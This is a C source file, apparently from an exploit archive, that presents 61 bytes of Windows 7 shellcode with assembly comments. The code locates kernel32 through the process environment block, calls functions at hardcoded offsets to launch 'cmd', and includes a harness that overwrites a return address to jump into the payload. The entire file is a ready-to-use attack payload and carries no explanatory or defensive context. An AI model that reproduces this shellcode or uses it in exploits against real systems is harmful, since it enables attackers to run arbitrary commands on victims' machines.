/*
 | Title: Windows Seven x64 (cmd) Shellcode 61 Bytes
 | Type: Shellcode
 | Author: agix
 | Platform: win32
 | Info: Tested on Windows Seven Pro Fr, Ultimate En, Premium Home En
*/

#include <stdio.h>

char shellcode[] =

"\x31\xC9"                   //xor ecx,ecx
"\x64\x8B\x71\x30"           //mov esi,[fs:ecx+0x30]
"\x8B\x76\x0C"               //mov esi,[esi+0xc]
"\x8B\x76\x1C"               //mov esi,[esi+0x1c]
"\x8B\x36"                   //mov esi,[esi]
"\x8B\x06"                   //mov eax,[esi]
"\x8B\x68\x08"               //mov ebp,[eax+0x8]
"\xEB\x20"                   //jmp short 0x35
"\x5B"                       //pop ebx
"\x53"                       //push ebx
"\x55"                       //push ebp
"\x5B"                       //pop ebx
"\x81\xEB\x11\x11\x11\x11"   //sub ebx,0x11111111
"\x81\xC3\xDA\x3F\x1A\x11"   //add ebx,0x111a3fda (for seven X86 add ebx,0x1119f7a6)
"\xFF\xD3"                   //call ebx
"\x81\xC3\x11\x11\x11\x11"   //add ebx,0x11111111
"\x81\xEB\x8C\xCC\x18\x11"   //sub ebx,0x1118cc8c (for seven X86 sub ebx,0x1114ccd7)
"\xFF\xD3"                   //call ebx
"\xE8\xDB\xFF\xFF\xFF"       //call dword 0x15
//db "cmd"
"\x63\x6d\x64";


int main(int argc, char **argv) {
        int *ret;
        ret = (int *)&ret + 2;
        (*ret) = (int) shellcode;
}